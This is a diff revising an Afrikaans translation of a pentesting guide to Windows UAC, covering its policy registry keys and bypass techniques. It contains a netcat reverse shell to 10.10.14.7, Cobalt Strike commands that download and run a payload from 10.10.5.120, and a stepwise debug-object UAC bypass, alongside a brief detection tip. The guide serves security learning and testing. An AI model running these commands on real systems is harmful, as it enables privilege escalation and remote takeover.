@@ -4,7 +4,7 @@
 
 ## UAC
 
-[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n funksie wat ’n **toestemmingsversoek vir aktiwiteite met verhoogde regte** aktiveer. Toepassings het verskillende `integrity`-vlakke, en ’n program met ’n **hoë vlak** kan take uitvoer wat die **stelsel moontlik kan kompromitteer**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van ’n nie-administrateurrekening**, tensy ’n administrateur hierdie toepassings/take uitdruklik magtig om toegang op administrateurvlak tot die stelsel te hê. Dit is ’n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as ’n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>
+[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n kenmerk wat ’n **toestemmingsversoek vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integrity`-vlakke, en ’n program met ’n **hoë vlak** kan take uitvoer wat **die stelsel moontlik in gevaar kan stel**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van ’n nie-administrateurrekening**, tensy ’n administrateur hierdie toepassings/take uitdruklik toestemming gee om toegang op administrateurvlak tot die stelsel te hê sodat hulle kan loop. Dit is ’n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar word nie as ’n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>
 
 Vir meer inligting oor integriteitsvlakke:
 
@@ -13,49 +13,50 @@ Vir meer inligting oor integriteitsvlakke:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wanneer UAC gebruik word, kry ’n administrateurgebruiker 2 tokens: ’n standaardgebruikertoken om gewone aksies op medium-integrity uit te voer, en een met die admin-privileges.
+Wanneer UAC aktief is, kry ’n administrateurgebruiker 2 tokens: ’n standaardgebruikertoken om gewone handelinge op medium-integriteit uit te voer, en een met die administrateurregte.
 
-Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan security policies gebruik om op plaaslike vlak op te stel hoe UAC vir hul organisasie werk (deur secpol.msc te gebruik), of dit in ’n Active Directory-domeinomgewing deur Group Policy Objects (GPO) op te stel en uit te stoot. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in besonderhede bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf bykomende besonderhede:
+Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot besonderhede hoe UAC werk, en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan sekuriteitsbeleide gebruik om te stel hoe UAC vir hul organisasie werk, hetsy plaaslik (met secpol.msc), of deur Group Policy Objects (GPO) in ’n Active Directory-domeinomgewing op te stel en uit te stuur. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in besonderhede bespreek. Daar is 10 Group Policy-instellings wat vir UAC ingestel kan word. Die volgende tabel verskaf meer besonderhede:
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| Group Policy-instelling                                                                                                                                                                                                                                                                                                                                                           | Registersleutel                | Verstekinstelling                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [Gebruikersrekeningbeheer: Admin Approval Mode vir die ingeboude Administrator-rekening](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
-| [Gebruikersrekeningbeheer: Gedrag van die elevation prompt vir administrateurs in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
-| [Gebruikersrekeningbeheer: Gedrag van die elevation prompt vir standaardgebruikers](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
-| [Gebruikersrekeningbeheer: Bespeur toepassingsinstallasies en vra vir elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
-| [Gebruikersrekeningbeheer: Verhoog slegs uitvoerbare lêers wat signed and validated is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
-| [Gebruikersrekeningbeheer: Verhoog slegs UIAccess-toepassings wat in veilige liggings geïnstalleer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
-| [Gebruikersrekeningbeheer: Laat alle administrateurs in Admin Approval Mode loop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
-| [Gebruikersrekeningbeheer: Laat UIAccess-toepassings toe om vir elevation te vra sonder om die secure desktop te gebruik](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
-| [Gebruikersrekeningbeheer: Skakel oor na die secure desktop wanneer daar vir elevation gevra word](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
-| [Gebruikersrekeningbeheer: Virtualiseer lêer- en register-skryffoute na liggings per gebruiker](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |
+| [Gebruikersrekeningbeheer: Admin Approval Mode vir die ingeboude Administrator-rekening](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Gedeaktiveer)                                             |
+| [Gebruikersrekeningbeheer: Gedrag van die verhogingsversoek vir administrateurs in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Versoek toestemming vir nie-Windows-binaries op die beveiligde werkskerm) |
+| [Gebruikersrekeningbeheer: Gedrag van die verhogingsversoek vir standaardgebruikers](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Versoek aanmeldbewyse op die beveiligde werkskerm)         |
+| [Gebruikersrekeningbeheer: Bespeur toepassingsinstallasies en versoek verhoging](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Geaktiveer; by verstek gedeaktiveer op Enterprise)           |
+| [Gebruikersrekeningbeheer: Verhoog slegs uitvoerbare lêers wat onderteken en gevalideer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Gedeaktiveer)                                             |
+| [Gebruikersrekeningbeheer: Verhoog slegs UIAccess-toepassings wat op veilige liggings geïnstalleer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Geaktiveer)                                              |
+| [Gebruikersrekeningbeheer: Laat alle administrateurs in Admin Approval Mode loop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Geaktiveer)                                              |
+| [Gebruikersrekeningbeheer: Laat UIAccess-toepassings toe om ’n verhogingsversoek te vertoon sonder om die beveiligde werkskerm te gebruik](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Gedeaktiveer)                                             |
+| [Gebruikersrekeningbeheer: Skakel na die beveiligde werkskerm wanneer ’n verhogingsversoek vertoon word](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Geaktiveer)                                              |
+| [Gebruikersrekeningbeheer: Virtualiseer mislukte skryfhandelinge na lêers en die register na liggings per gebruiker](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Geaktiveer)                                              |
 
-### Policies vir die installering van sagteware op Windows
+### Beleide vir die installering van sagteware op Windows
 
-Die **plaaslike security policies** ("secpol.msc" op die meeste stelsels) is by verstek opgestel om **te verhoed dat nie-admingebruikers sagteware-installasies uitvoer**. Dit beteken dat selfs al kan ’n nie-admingebruiker die installer vir jou sagteware aflaai, hulle dit nie sonder ’n adminrekening sal kan uitvoer nie.
+Die **plaaslike sekuriteitsbeleide** ("secpol.msc" op die meeste stelsels) is by verstek so opgestel dat **nie-administrateurgebruikers nie sagteware-installasies kan uitvoer nie**. Dit beteken dat selfs as ’n nie-administrateurgebruiker die installeerder vir jou sagteware kan aflaai, hulle dit nie sonder ’n administrateurrekening sal kan uitvoer nie.
 
-### Registry Keys om UAC te dwing om vir elevation te vra
+### Registersleutels om UAC te dwing om ’n verhoging te versoek
 
-As ’n standaardgebruiker sonder admin-regte kan jy verseker dat die "standaard"-rekening **deur UAC vir credentials gevra word** wanneer dit sekere aksies probeer uitvoer. Hierdie aksie vereis dat sekere **registry keys** gewysig word, waarvoor jy admin-permissies nodig het, tensy daar ’n **UAC bypass** is, of die aanvaller reeds as admin aangemeld is.
+As ’n standaardgebruiker sonder administrateurregte kan jy sorg dat die "standaard"-rekening **deur UAC gevra word vir aanmeldbewyse** wanneer dit sekere handelinge probeer uitvoer. Hiervoor moet sekere **registersleutels** gewysig word, waarvoor jy administrateurtoestemmings nodig het, tensy daar ’n **UAC bypass** is of die aanvaller reeds as administrateur aangemeld is.
 
-Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om hul **rekeningcredentials weer in te voer** om administratiewe aksies uit te voer.
+Selfs as die gebruiker in die **Administrators**-groep is, dwing hierdie veranderinge die gebruiker om **hul rekeningbewyse weer in te voer** om administratiewe handelinge uit te voer.
 
-**In die praktyk is dit slegs nuttig wanneer jy reeds ’n verhoogde token, ’n UAC bypass, of ’n misconfiguration het wat jou toelaat om hierdie keys te verander; andersins word die registry write self geblokkeer.**
+**In die praktyk is dit net nuttig wanneer jy reeds ’n verhoogde token, ’n UAC bypass of ’n verkeerde konfigurasie het waarmee jy hierdie sleutels kan verander; anders word die skryfhandeling na die register self geblokkeer.**
 
-Die registry keys en entries wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):
+Die registersleutels en inskrywings wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
-- `ConsentPromptBehaviorUser` = 1 (3)
-- `ConsentPromptBehaviorAdmin` = 1 (5)
-- `PromptOnSecureDesktop` = 1 (1)
+  - `ConsentPromptBehaviorUser` = 1 (3)
+  - `ConsentPromptBehaviorAdmin` = 1 (5)
+  - `PromptOnSecureDesktop` = 1 (1)
 
-Dit kan ook handmatig deur die Local Security Policy-tool gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul credentials weer in te voer.
+Dit kan ook met die hand deur die Local Security Policy-nutsding gedoen word. Sodra dit verander is, vra administratiewe handelinge die gebruiker om hul aanmeldbewyse weer in te voer.
 
 ### Nota
 
-**Gebruikersrekeningbeheer is nie ’n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge ontsnap en administrateurregte verkry sonder ’n local privilege escalation exploit nie.
+**Gebruikersrekeningbeheer is nie ’n sekuriteitsgrens nie.** Standaardgebruikers kan dus nie sonder ’n plaaslike privilege escalation-exploit uit hul rekeninge breek en administrateurregte verkry nie.
 
-### Vra ’n gebruiker vir 'full computer access'
+### Vra ’n gebruiker vir ‘volle toegang tot die rekenaar’
+
 ```powershell
 hostname | Set-Clipboard
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
@@ -64,36 +65,38 @@ cd C:\Users\hacedorderanas\Desktop
 New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
 Enter-PSSession -ComputerName hostname
 ```
+
 ### UAC-voorregte
 
-- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang verkry tot data met 'n lae integriteitsvlak (soos die vouer met tydelike Internet-lêers). Dit word gedoen deur die blaaier met 'n lae-integriteitstoken te laat loop. Wanneer die blaaier probeer om toegang te verkry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en verleen toegang dienooreenkomstig. Hierdie funksie help om te voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel verkry.
-- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegangstoken wat 'n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van 'n gebruiker se regte en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat credentials is wat gebruik word om die gebruiker teen die rekenaar en hulpbronne op die netwerk te authenticate.
+- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met ’n hoë integriteitsvlak (soos webblaaiers) toegang tot data met ’n lae integriteitsvlak kry (soos die tydelike Internet-lêergids). Dit word gedoen deur die blaaier met ’n lae-integriteitstoken te laat loop. Wanneer die blaaier toegang probeer kry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die proses se integriteitsvlak en verleen toegang dienooreenkomstig. Hierdie kenmerk help voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel kry.
+- Wanneer ’n gebruiker by Windows aanmeld, skep die stelsel ’n toegangstoken wat ’n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van ’n gebruiker se regte en vermoëns. Die token bevat ook ’n lys van die gebruiker se geloofsbriewe, wat gebruik word om die gebruiker by die rekenaar en netwerkhulpbronne te staaf.
 
 ### Autoadminlogon
 
-Om Windows te konfigureer om outomaties tydens opstart by 'n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon`-registersleutel**. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register blootstel.
+Om Windows op te stel om outomaties tydens opstart by ’n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon`-registersleutel** in. Dit is nuttig vir kioskomgewings of toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register blootstel.
 
-Stel die volgende sleutels met die Registry Editor of `reg add`:
+Stel die volgende sleutels met behulp van die Registerredigeerder of `reg add` in:
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
-- `AutoAdminLogon` = 1
-- `DefaultUsername` = username
-- `DefaultPassword` = password
+  - `AutoAdminLogon` = 1
+  - `DefaultUsername` = username
+  - `DefaultPassword` = password
 
-Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.
+Om die normale aanmeldgedrag te herstel, stel `AutoAdminLogon` op 0.
 
-## UAC bypass
+## UAC-bypass
 
 > [!TIP]
-> Let daarop dat UAC bypass eenvoudig is as jy grafiese toegang tot die slagoffer het, aangesien jy bloot op "Yes" kan klik wanneer die UAC-aanporboodskap verskyn
+> Let daarop dat as jy grafiese toegang tot die slagoffer het, UAC-bypass eenvoudig is, aangesien jy net op "Yes" kan klik wanneer die UAC-aanporboodskap verskyn
 
-Die UAC bypass is in die volgende situasie nodig: **UAC is geaktiveer, jou proses loop in 'n medium-integriteitskonteks, en jou gebruiker behoort aan die administrators-groep**.
+Die UAC-bypass is nodig in die volgende situasie: **UAC is geaktiveer, jou proses loop in ’n medium-integriteitskonteks, en jou gebruiker behoort aan die administrateursgroep**.
 
-Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te bypass as dit op die hoogste sekuriteitsvlak (Always) is as wanneer dit op enige van die ander vlakke (Default) is.**
+Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te omseil wanneer dit op die hoogste sekuriteitsvlak (Always) is as op enige van die ander vlakke (Default).**
 
-### Vinnige triage vanaf 'n medium-integrity shell
+### Vinnige triage vanaf ’n medium-integriteitsdop
 
-Voordat jy 'n bypass probeer, bevestig dat jy in die regte scenario is en koppel die host build aan bekende werkende metodes:
+Voordat jy ’n bypass probeer, bevestig dat jy in die regte scenario is en bepaal die gasheer se bouweergawe om bekende werkende metodes te vind:
+
 ```powershell
 whoami /groups
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
@@ -102,44 +105,48 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prom
 powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
 schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 ```
+
 Praktiese notas:
-- As `EnableLUA=0` is, het jy nie 'n bypass nodig nie: enige admin-token kan direk vir hoë integriteit versoek.
-- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-based bypasses.
-- `Always Notify` verhoog die uitdaging, maar jy behoort steeds die presiese build te toets in plaas daarvan om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible` methods op moderne Windows-builds.<sup>[[3]](#references)</sup>
+- As `EnableLUA=0`, het jy nie ’n bypass nodig nie: enige admin-token kan direk hoë integriteit aanvra.
+- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-gebaseerde bypasses.
+- `Always Notify` verhoog die drempel, maar jy moet steeds die presiese build toets eerder as om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible`-metodes op moderne Windows-builds.<sup>[[3]](#references)</sup>
 
 ### UAC gedeaktiveer
 
-As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **'n reverse shell met admin privileges uitvoer** (high integrity level) deur iets soos die volgende te gebruik:
+As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **’n reverse shell met admin-regte uitvoer** (hoë integriteitsvlak) deur iets soos die volgende te gebruik:
+
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC bypass with token duplication
+
+#### UAC bypass met token duplication
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### Local RPC + reusable debug object
+### Local RPC + herbruikbare debug object
 
-Die AppInfo local RPC-koppelvlak `201ef99a-7fa0-444c-9399-19ba84f12a1a` kan ’n proses met debugging enabled skep. Prosesse wat deur debugging op dieselfde thread geskep word, deel die thread se debug object; ’n creation debug event bevat ’n process handle met volledige toegang, selfs wanneer die RPC-resultaat self slegs beperkte toegang verleen. Dit maak debug-object-hergebruik ’n UAC-primitive vir ’n gebruiker met medium integrity wat deel is van die Administrators group.<sup>[[11]](#references)[[12]](#references)</sup>
+Die AppInfo local RPC-koppelvlak `201ef99a-7fa0-444c-9399-19ba84f12a1a` kan 'n proses skep met debugging geaktiveer. Prosesse wat deur debugging op dieselfde thread geskep word, deel die thread se debug object; 'n skeppings-debug event bevat 'n process handle met volle toegang, selfs wanneer die RPC-resultaat self slegs beperkte toegang verleen. Dit maak die hergebruik van 'n debug object 'n UAC-primitief vir 'n gebruiker met medium integriteit wat lid van die Administrators-groep is.<sup>[[11]](#references)[[12]](#references)</sup>
 
-’n Praktiese ketting is:<sup>[[11]](#references)[[12]](#references)</sup>
+'n Praktiese ketting is:<sup>[[11]](#references)[[12]](#references)</sup>
 
-1. Roep die local RPC-metode aan (direk of deur `NdrAsyncClientCall`) om ’n nie-elevated sacrificial process met debugging enabled te skep.
-2. Doen navraag oor `ProcessDebugObjectHandle` met `NtQueryInformationProcess`, ontkoppel dit met `NtRemoveProcessDebug`, behou die object en terminate die sacrificial process.
-3. Gebruik dieselfde RPC-koppelvlak om ’n trusted auto-elevated process te skep, en assosieer dan die gestoorde object met die calling thread deur `DbgUiSetThreadDebugObject`.
-4. Roep `WaitForDebugEvent` aan en neem die `CREATE_PROCESS_DEBUG_EVENT` process handle; duplicate dit met `NtDuplicateObject` voordat jy voortgaan.
-5. Voorsien die duplicated handle aan `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` en launch die payload met ’n extended startup-info structure. Dit hergebruik beide die elevated process context en gee die child ’n trusted-looking parent relationship.
+1. Roep die local RPC-metode (direk of deur `NdrAsyncClientCall`) om 'n nie-verhoogde opofferingsproses met debugging geaktiveer te skep.
+2. Doen navraag oor `ProcessDebugObjectHandle` met `NtQueryInformationProcess`, ontkoppel dit met `NtRemoveProcessDebug`, behou die object en beëindig die opofferingsproses.
+3. Gebruik dieselfde RPC-koppelvlak om 'n vertroude, outomaties verhoogde proses te skep, en koppel dan die gestoorde object aan die oproepende thread deur `DbgUiSetThreadDebugObject`.
+4. Roep `WaitForDebugEvent` en neem die process handle uit die `CREATE_PROCESS_DEBUG_EVENT`; dupliseer dit met `NtDuplicateObject` voordat jy voortgaan.
+5. Gee die gedupliseerde handle aan `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` en begin die payload met 'n uitgebreide startup-info-struktuur. Dit hergebruik sowel die verhoogde proses-konteks as gee die child 'n vertrouenswaardige ouerproses-verhouding.
 
-Hunt vir die kort sequence eerder as net die auto-elevated binary: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, ’n immediate creation-debug event, handle duplication, en ’n child waarvan die recorded parent nie ooreenstem met die process wat die creation APIs uitgevoer het nie.<sup>[[12]](#references)</sup>
+Soek na die kort reeks stappe eerder as net die outomaties verhoogde binêre lêer: plaaslike AppInfo RPC-prosesskepping, `ProcessDebugObjectHandle`-navrae, debugger-ontkoppeling/herkoppeling, 'n onmiddellike skeppings-debug event, handle-duplisering, en 'n child waarvan die aangetekende ouerproses nie ooreenstem met die proses wat die skeppings-API's uitgevoer het nie.<sup>[[12]](#references)</sup>
 
-### **Baie** Basic UAC "bypass" (full file system access)
+### **Baie** Basiese UAC-"bypass" (volle lêerstelseltoegang)
 
-As jy ’n shell het met ’n gebruiker wat binne die Administrators group is, kan jy die **C$** shared via SMB (file system) plaaslik in ’n nuwe disk mount, en jy sal **toegang tot alles binne die file system** hê (selfs die Administrator home folder).
+As jy 'n shell het met 'n gebruiker wat aan die Administrators-groep behoort, kan jy die **C$-share** wat via SMB gedeel word (lêerstelsel) plaaslik op 'n nuwe skyf mount, en dan sal jy **toegang tot alles in die lêerstelsel hê** (selfs die Administrator-tuisgids).
 
 > [!WARNING]
-> **Dit lyk asof hierdie trick nie meer werk nie**
+> **Dit lyk of hierdie truuk nie meer werk nie**
+
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -147,9 +154,11 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
+
 ### UAC bypass met Cobalt Strike
 
-Die Cobalt Strike-tegnieke sal slegs werk indien UAC nie op sy hoogste sekuriteitsvlak gestel is nie.
+Die Cobalt Strike-tegnieke werk slegs as UAC nie op die maksimum sekuriteitsvlak ingestel is nie.
+
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -161,27 +170,29 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
+
 **Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.
 
 ### Verhoogde COM-koppelvlakke (`ICMLuaUtil` / `CMSTPLUA`)
 
-Outomaties verhoogde COM-objekte bly ’n praktiese UAC-aanvalsoppervlak op moderne builds. `ICMLuaUtil` word steeds deur UACME as werkend op huidige Windows-vertakkings opgespoor, en offensive tooling hou aan om `CMSTPLUA` aan te pas deur ’n interaktiewe desktop-proses, 64-bis-uitvoering en soms PEB/proses-maskering te kombineer voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>
+Outomaties verhoogde COM-objekte bly ’n praktiese UAC-aanvalsoppervlak op moderne builds. UACME hou steeds rekord van `ICMLuaUtil` as werkend op huidige Windows-takke, en offensive tooling pas `CMSTPLUA` steeds aan deur ’n interaktiewe werkskermproses, 64-bit-uitvoering en soms PEB-/prosesnabootsing te kombineer voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>
 
 Praktiese wenke:
-- Verkies ’n **64-bis**-proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of ’n child daarvan).
-- As ’n raw shell misluk, probeer weer vanaf ’n BOF / UACME-implementering in plaas van ’n naïewe `CreateProcess`-wrapper.
